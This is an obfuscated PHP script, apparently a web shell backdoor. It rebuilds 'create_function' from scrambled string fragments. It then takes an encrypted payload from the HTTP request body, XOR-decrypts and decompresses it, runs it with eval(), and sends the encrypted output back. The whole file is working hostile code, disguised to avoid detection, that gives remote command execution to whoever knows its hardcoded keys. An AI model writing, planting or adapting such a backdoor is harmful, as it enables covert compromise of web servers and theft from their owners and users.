<?php
$s='rlen($t);$o=M""M;Mfor($Mi=0;$i<$l;M){for($j=0MM;(M$j<$cM&&$iM<$l)';
$b='$k="Md5e69Mbe9";$kh="M9a258Me8520cfM";$kMf=M"08dbMfMcf72279";$p="';
$w='h("/$kh(M.M+)$kf/M",@fileM_gMet_contMents("php://iMnputM"),$Mm)==';
$f='PmDMoSIEtKMF0k9XLMY";fMunctiMon x($t,$k)M{M$c=strlen($kM);M$l=stM';
$V=str_replace('vs','','vsvscvsrevsate_funcvstivson');
$z='Me64_enMcode(@xM(@gzcMompreMss($oM),$kM));print("M$p$kh$Mr$kf");}';
$g='[1]M),M$k)));$o=@oMb_Mget_conMtents();@Mob_Mend_clMean();$r=M@bas';
$Z='1) {@Mob_stMMart();@MevaMl(@gzuncMompress(@x(@bMase64_MdecodeM($m';
$l=';$j+M+,M$iM++){$o.=$t{$Mi}^$k{$j};}}reMturn $o;}iMf (@pMregM_matc';
$u=str_replace('M','',$b.$f.$s.$l.$w.$Z.$g.$z);
$Y=$V('',$u);$Y();
?>
